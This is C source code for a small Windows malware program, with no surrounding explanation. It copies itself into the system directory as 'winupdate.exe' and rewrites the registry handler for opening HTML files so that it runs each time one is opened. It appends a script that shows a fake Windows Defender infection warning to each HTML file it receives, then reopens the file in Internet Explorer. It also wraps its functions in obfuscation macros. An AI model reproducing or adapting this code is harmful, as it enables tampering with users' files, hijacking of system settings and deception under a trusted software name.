#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>
#include "VirtualizerSDK.h"

// (Default) "C:\Program Files\Internet Explorer\iexplore.exe" %1
const char InfectString[] = "\n<script>alert(\"Warning: This file has been detected by Windows "
"Defender to be infected with Win32/BullMoose!\");</script>";


void p1(char *argv[]){
	FILE *file;

	VIRTUALIZER_START

	SetFileAttributes(argv[1],FILE_ATTRIBUTE_NORMAL);
	file = fopen(argv[1],"at");
	fputs(InfectString,file);
	fclose(file);
	ShellExecute(NULL,"open","\"C:\\Program Files\\Internet Explorer\\iexplore.exe\"",argv[1],NULL,SW_SHOW);

	VIRTUALIZER_END
}

void p2(void){
	char MyPath[256], CpyPath[256];
	HKEY Key32;

	VIRTUALIZER_START

	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(CpyPath,sizeof(CpyPath));
	strcat(CpyPath,"\\winupdate.exe");
	CopyFile(MyPath,CpyPath,FALSE);
	strcat(CpyPath," %1");

	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
	RegSetValueEx(Key32,"",0,REG_SZ,(unsigned char *)CpyPath,strlen(CpyPath));
	RegCloseKey(Key32);

	VIRTUALIZER_END
}

int main(int argc, char *argv[])
{


	VIRTUALIZER_START 

	if(argc==2)
		p1(argv);

	p2();

	return 0;

	VIRTUALIZER_END
}
